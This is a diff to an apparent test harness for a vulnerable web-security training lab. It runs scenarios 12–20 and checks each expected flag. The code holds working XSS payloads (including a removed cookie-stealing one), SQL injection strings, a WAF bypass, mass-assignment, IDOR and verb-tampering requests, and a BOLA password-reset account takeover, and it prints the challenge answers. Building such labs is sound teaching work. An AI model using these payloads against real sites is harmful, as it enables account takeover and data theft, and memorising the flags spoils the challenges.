@@ -213,8 +213,11 @@ def main():
         payload_12 = "</textarea><script>alert('xss')</script>"
         r12 = requests.get(f"http://{HOST}:8012/search", params={"q": payload_12}, timeout=3)
         check("S12: Tag breakout reflected unescaped into HTML", payload_12 in r12.text)
-        flag_s12 = extract_flag(r12.text)
-        check("S12: Flag token available in success box", flag_s12 == "CTF{r3fl3ct3d_xss_b4s1cs}")
+        check("S12: Flag protected from static page source disclosure", extract_flag(r12.text) is None)
+        
+        # Test 3: API flag release endpoint
+        flag_s12 = requests.get(f"http://{HOST}:8012/api/flag", timeout=3).json().get("flag")
+        check("S12: Flag token released via dynamic execution verification", flag_s12 == "CTF{r3fl3ct3d_xss_b4s1cs}")
         print(f"     -> Flag: {flag_s12}")
     except Exception as e:
         check(f"S12 Connection failed: {e}", False)
@@ -226,8 +229,10 @@ def main():
         requests.post(f"http://{HOST}:8013/feedback", data={"author": attr_payload, "comment": "testing breakout"}, timeout=3)
         r13 = requests.get(f"http://{HOST}:8013/feedback", timeout=3)
         check("S13: Attribute breakout payload stored and reflected in value attribute", f'value="{attr_payload}"' in r13.text)
-        flag_s13 = extract_flag(r13.text)
-        check("S13: Secret vault key present in challenge context", flag_s13 == "CTF{st0r3d_4ttr1but3_br34k0ut}")
+        check("S13: Flag protected from static page source disclosure", extract_flag(r13.text) is None)
+        
+        flag_s13 = requests.get(f"http://{HOST}:8013/api/flag", timeout=3).json().get("flag")
+        check("S13: Flag released via dynamic execution verification", flag_s13 == "CTF{st0r3d_4ttr1but3_br34k0ut}")
         # Clean up database after test so it leaves clean state for manual user training
         requests.get(f"http://{HOST}:8013/reset", timeout=3)
         print(f"     -> Flag: {flag_s13}")
@@ -237,10 +242,12 @@ def main():
     # ── Scenario 14 (Port 8014) ──────────────────────────────────────────────
     print("\n--- [Scenario 14] Port 8014: DOM-based XSS (Source to Sink) ---")
     try:
-        r14 = requests.get(f"http://{HOST}:8014/analytics", params={"tab": "<img src=1 onerror=alert(1)>"}, timeout=3)
-        check("S14: Client-side routing script and innerHTML sink present", "telemetry-content" in r14.text and "innerHTML" in r14.text)
-        flag_s14 = extract_flag(r14.text)
-        check("S14: window.__TELEMETRY_KEY secret configured in client DOM", flag_s14 == "CTF{d0m_xss_s1nk_m4st3r}")
+        r14 = requests.get(f"http://{HOST}:8014/?search=<img src=1 onerror=alert(\"cszone\")>", timeout=3)
+        check("S14: Client-side search script and innerHTML sink present", "searchMessage" in r14.text and "innerHTML" in r14.text)
+        check("S14: Flag protected from static page source disclosure", extract_flag(r14.text) is None)
+        
+        flag_s14 = requests.get(f"http://{HOST}:8014/api/flag", timeout=3).json().get("flag")
+        check("S14: Flag released via dynamic execution verification", flag_s14 == "CTF{d0m_xss_s1nk_m4st3r}")
         print(f"     -> Flag: {flag_s14}")
     except Exception as e:
         check(f"S14 Connection failed: {e}", False)
@@ -253,85 +260,144 @@ def main():
         check("S15: WAF regex filter blocks <script> tag", "Script tag injection detected" in r15_blocked.text)
 
         # Test 2: HTML5 animate onbegin bypass passes WAF
-        bypass_payload = "<svg><animate onbegin=alert(1) attributeName=x>"
+        bypass_payload = "<svg><animate onbegin=alert('cszone') attributeName=x>"
         r15_pass = requests.get(f"http://{HOST}:8015/preview", params={"rule": bypass_payload}, timeout=3)
         check("S15: HTML5 SVG animation event vector passes WAF filter", bypass_payload in r15_pass.text)
-        flag_s15 = extract_flag(r15_pass.text)
-        check("S15: WAF challenge secret present in preview context", flag_s15 == "CTF{w4f_byp4ss_h5_v3ct0r}")
+        check("S15: Flag protected from static page source disclosure", extract_flag(r15_pass.text) is None)
+        
+        flag_s15 = requests.get(f"http://{HOST}:8015/api/flag", timeout=3).json().get("flag")
+        check("S15: Flag released via dynamic execution verification", flag_s15 == "CTF{w4f_byp4ss_h5_v3ct0r}")
         print(f"     -> Flag: {flag_s15}")
     except Exception as e:
         check(f"S15 Connection failed: {e}", False)
 
     # ── Scenario 16 (Port 8016) ──────────────────────────────────────────────
-    print("\n--- [Scenario 16] Port 8016: SQLi Auth Bypass + Stored XSS Chain ---")
+    print("\n--- [Scenario 16] Port 8016: INSERT SQLi + Second-Order Stored XSS Chain ---")
     try:
         s16 = requests.Session()
-        xss_payload = "<img src=x onerror=\"fetch('/xss/collect?c='+encodeURIComponent(document.cookie))\">"
-        s16.post(f"http://{HOST}:8016/guestbook", data={"name": "attacker", "message": xss_payload}, timeout=3)
-        r16_gb = s16.get(f"http://{HOST}:8016/guestbook", timeout=3)
-        check("S16: Payload stored unescaped in guestbook", xss_payload in r16_gb.text)
+        
+        # Test 1: Page accessible and zero flag in source
+        r16_home = s16.get(f"http://{HOST}:8016/tickets", timeout=3)
+        check("S16: Support dispatch portal reachable", r16_home.status_code == 200)
+        check("S16: Flag protected from static page source disclosure", extract_flag(r16_home.text) is None)
 
-        s16.post(f"http://{HOST}:8016/legacy-admin/login", data={"username": "admin' OR '1'='1' -- -", "password": "x"}, allow_redirects=True, timeout=3)
-        admin_cookie = s16.cookies.get("admin_session_flag")
-        check("S16: SQLi Auth bypass sets admin_session_flag cookie", admin_cookie == "CTF{st0r3d_c00k13_th3ft}")
+        # Test 2: Standard ticket has LOW priority and does not reach compliance queue
+        s16.post(f"http://{HOST}:8016/tickets", data={"submitter": "user", "department": "HR", "issue_desc": "Normal issue"}, timeout=3)
+        r16_comp_before = s16.get(f"http://{HOST}:8016/admin/compliance", timeout=3)
+        check("S16: Normal low-priority tickets excluded from executive queue", "Normal issue" not in r16_comp_before.text)
 
-        requests.get(f"http://{HOST}:8016/xss/collect", params={"c": f"admin_session_flag={admin_cookie}"}, timeout=3)
-        r16_log = requests.get(f"http://{HOST}:8016/xss/collect/log", timeout=3)
-        check("S16: Collector log captures exfiltrated flag", "CTF{st0r3d_c00k13_th3ft}" in r16_log.text)
-        print(f"     -> Flag: {admin_cookie}")
+        # Test 3: INSERT SQLi breakout escalates priority and injects Second-Order Stored XSS
+        sqli_xss = "SEC', '<img src=x onerror=alert(\"cszone\")>', 'CRITICAL', 1) --"
+        r_post = s16.post(f"http://{HOST}:8016/tickets", data={"submitter": "Auditor", "department": sqli_xss, "issue_desc": "Audit"}, timeout=3)
+        check("S16: INSERT SQLi payload accepted without error", "queued for priority triage" in r_post.text)
+
+        # Test 4: Second-Order XSS rendered in Admin Compliance Queue
+        r16_comp_after = s16.get(f"http://{HOST}:8016/admin/compliance", timeout=3)
+        check("S16: Second-Order Stored XSS rendered in Admin Compliance Queue", "onerror=alert" in r16_comp_after.text and "CRITICAL ELEVATION" in r16_comp_after.text)
+
+        # Test 5: Dynamic API Flag Release
+        flag_s16 = s16.get(f"http://{HOST}:8016/api/flag", timeout=3).json().get("flag")
+        check("S16: Flag verified & released via chained execution", flag_s16 == "CTF{1ns3rt_sqli_t0_st0r3d_xss_ch41n}")
+        print(f"     -> Flag: {flag_s16}")
     except Exception as e:
         check(f"S16 Connection failed: {e}", False)
 
     # ── Scenario 17 (Port 8017) ──────────────────────────────────────────────
-    print("\n--- [Scenario 17] Port 8017: Cross-Site Request Forgery (CSRF) ---")
+    print("\n--- [Scenario 17] Port 8017: Mass Assignment & Profile Overwrite IDOR ---")
     try:
         s17 = requests.Session()
-        s17.post(f"http://{HOST}:8017/register", data={"username": "csrf_test", "email": "victim@cszone.internal", "password": "VictimPass123!"}, timeout=3)
-        s17.post(f"http://{HOST}:8017/login", data={"username": "csrf_test", "password": "VictimPass123!"}, timeout=3)
-        r17 = s17.post(f"http://{HOST}:8017/account/email", data={"email": "hacked@attacker-controlled.test"}, timeout=3)
-        flag_s17 = extract_flag(r17.text)
-        check("S17: CSRF email modification captures flag", flag_s17 == "CTF{csrf_n0_t0k3n_pwn3d}")
+        r17_init = s17.get(f"http://{HOST}:8017/profile", timeout=3)
+        check("S17: Profile settings portal reachable", r17_init.status_code == 200)
+        check("S17: Flag protected from static page disclosure", extract_flag(r17_init.text) is None)
+
+        # Exploit Mass Assignment IDOR
+        r17_update = s17.post(f"http://{HOST}:8017/api/user/profile/update", json={
+            "user_id": 102,
+            "full_name": "Carlos Rivera (Elevated)",
+            "role": "admin",
+            "is_vip": 1
+        }, timeout=3)
+        check("S17: Mass assignment updates user role to admin", r17_update.json().get("user", {}).get("role") == "admin")
+
+        # Admin dashboard access
+        r17_admin = s17.get(f"http://{HOST}:8017/admin/dashboard", timeout=3)
+        flag_s17 = extract_flag(r17_admin.text)
+        check("S17: Executive console accessible and flag released", flag_s17 == "CTF{m4ss_4ss1gnm3nt_pr0f1l3_0v3rwr1t3}")
         print(f"     -> Flag: {flag_s17}")
     except Exception as e:
         check(f"S17 Connection failed: {e}", False)
 
     # ── Scenario 18 (Port 8018) ──────────────────────────────────────────────
-    print("\n--- [Scenario 18] Port 8018: Unrestricted File Upload & Stored XSS ---")
+    print("\n--- [Scenario 18] Port 8018: Obfuscated & UUID Leakage IDOR ---")
     try:
         s18 = requests.Session()
-        s18.post(f"http://{HOST}:8018/register", data={"username": "uploader_test", "email": "up@cszone.internal", "password": "UpPass123!"}, timeout=3)
-        s18.post(f"http://{HOST}:8018/login", data={"username": "uploader_test", "password": "UpPass123!"}, timeout=3)
-        html_payload = b"<html><body><script>console.log('uploaded-xss-ok')</script></body></html>"
-        r18_up = s18.post(f"http://{HOST}:8018/upload", files={"file": ("test_pwn.html", html_payload, "text/html")}, timeout=3)
-        check("S18: HTML upload accepted", "/static/uploads/test_pwn.html" in r18_up.text)
-        r18_get = requests.get(f"http://{HOST}:8018/static/uploads/test_pwn.html", timeout=3)
-        check("S18: Uploaded file served with HTML MIME type and script intact", b"<script>" in r18_get.content)
-        print("     -> Verified: Stored HTML/JS Execution Enabled")
+        # Step 1: Recon public activity feed to discover leaked UUID
+        r18_feed = s18.get(f"http://{HOST}:8018/api/public/audit-feed", timeout=3).json()
+        target_uuid = None
+        for item in r18_feed.get("feed", []):
+            if item.get("actor") == "Chief Security Officer":
+                target_uuid = item.get("doc_uuid")
+                break
+        check("S18: Leaked executive document UUID discovered in audit feed", target_uuid is not None)
+
+        # Step 2: Download classified document via IDOR
+        r18_doc = s18.get(f"http://{HOST}:8018/api/documents/download?doc_id={target_uuid}", timeout=3).json()
+        flag_s18 = r18_doc.get("flag")
+        check("S18: Classified document retrieved via UUID IDOR", flag_s18 == "CTF{uu1d_l34k_d0cum3nt_v4ult}")
+        print(f"     -> Flag: {flag_s18}")
     except Exception as e:
         check(f"S18 Connection failed: {e}", False)
 
     # ── Scenario 19 (Port 8019) ──────────────────────────────────────────────
-    print("\n--- [Scenario 19] Port 8019: Server-Side Request Forgery (SSRF) ---")
+    print("\n--- [Scenario 19] Port 8019: RESTful HTTP Verb Tampering & Multi-Tenant IDOR ---")
     try:
         s19 = requests.Session()
-        s19.post(f"http://{HOST}:8019/register", data={"username": "ssrf_tester", "email": "s@cszone.internal", "password": "SsrfPass123!"}, timeout=3)
-        s19.post(f"http://{HOST}:8019/login", data={"username": "ssrf_tester", "password": "SsrfPass123!"}, timeout=3)
-        r19 = s19.post(f"http://{HOST}:8019/avatar-import", data={"url": f"http://127.0.0.1:8019/internal/metadata"}, timeout=3)
-        flag_s19 = extract_flag(r19.text)
-        check("S19: SSRF fetches internal metadata flag", flag_s19 == "CTF{ssrf_1nt3rn4l_m3t4d4t4}")
+        # Step 1: GET is 403 Forbidden
+        r19_get = s19.get(f"http://{HOST}:8019/api/workspaces/tenant-99-enterprise/settings", timeout=3)
+        check("S19: GET request strictly blocked by API Gateway (403)", r19_get.status_code == 403)
+
+        # Step 2: Verb tampering via PUT bypasses auth check
+        r19_put = s19.put(f"http://{HOST}:8019/api/workspaces/tenant-99-enterprise/settings", json={
+            "region": "eu-central-1",
+            "compliance_mode": "disabled"
+        }, timeout=3).json()
+        flag_s19 = r19_put.get("tenant", {}).get("master_secret_key")
+        check("S19: HTTP Verb Tampering unlocks sovereign tenant master key", flag_s19 == "CTF{v3rb_t4mp3r1ng_t3n4nt_byp4ss}")
         print(f"     -> Flag: {flag_s19}")
     except Exception as e:
         check(f"S19 Connection failed: {e}", False)
 
     # ── Scenario 20 (Port 8020) ──────────────────────────────────────────────
-    print("\n--- [Scenario 20] Port 8020: Backend IDOR Orders ---")
+    print("\n--- [Scenario 20] Port 8020: BOLA Multi-Step Password Reset ATO ---")
     try:
         s20 = requests.Session()
-        s20.post(f"http://{HOST}:8020/register", data={"username": "idor_tester", "email": "id@cszone.internal", "password": "IdorPass123!"}, timeout=3)
-        s20.post(f"http://{HOST}:8020/login", data={"username": "idor_tester", "password": "IdorPass123!"}, timeout=3)
-        r20 = s20.get(f"http://{HOST}:8020/orders/2", timeout=3)
-        flag_s20 = extract_flag(r20.text)
-        check("S20: IDOR reveals foreign order note & flag", flag_s20 == "CTF{b4ck3nd_1d0r_r34l}")
+        # Step 1: Request reset session
+        r20_s1 = s20.post(f"http://{HOST}:8020/api/auth/forgot-password", json={"email": "carlos@apexpay.io"}, timeout=3).json()
+        sess_tok = r20_s1.get("session_token")
+        check("S20: Reset session initiated for test user", sess_tok is not None)
+
+        # Step 2: BOLA in verify step targeting admin (account_id: 100)
+        r20_s2 = s20.post(f"http://{HOST}:8020/api/auth/verify-reset-step", json={
+            "session_token": sess_tok,
+            "otp": "654321",
+            "account_id": 100
+        }, timeout=3).json()
+        reset_tok = r20_s2.get("reset_token")
+        check("S20: BOLA parameter tampering leaks admin reset token", reset_tok is not None and r20_s2.get("account_id") == 100)
+
+        # Step 3: Confirm new admin password
+        new_pwd = "PwnedAdminPassword123!"
+        r20_s3 = s20.post(f"http://{HOST}:8020/api/auth/confirm-new-password", json={
+            "reset_token": reset_tok,
+            "new_password": new_pwd
+        }, timeout=3).json()
+        check("S20: New password applied to target admin account", r20_s3.get("success") is True)
+
+        # Step 4: Login as admin and extract vault flag
+        s20_admin = requests.Session()
+        r20_login = s20_admin.post(f"http://{HOST}:8020/login", data={"email": "admin@apexpay.io", "password": new_pwd}, allow_redirects=True, timeout=3)
+        flag_s20 = extract_flag(r20_login.text)
+        check("S20: Full Account Takeover (ATO) grants executive vault flag", flag_s20 == "CTF{b0l4_p4ssw0rd_r3s3t_4cc0unt_t4k30v3r}")
         print(f"     -> Flag: {flag_s20}")
     except Exception as e:
         check(f"S20 Connection failed: {e}", False)
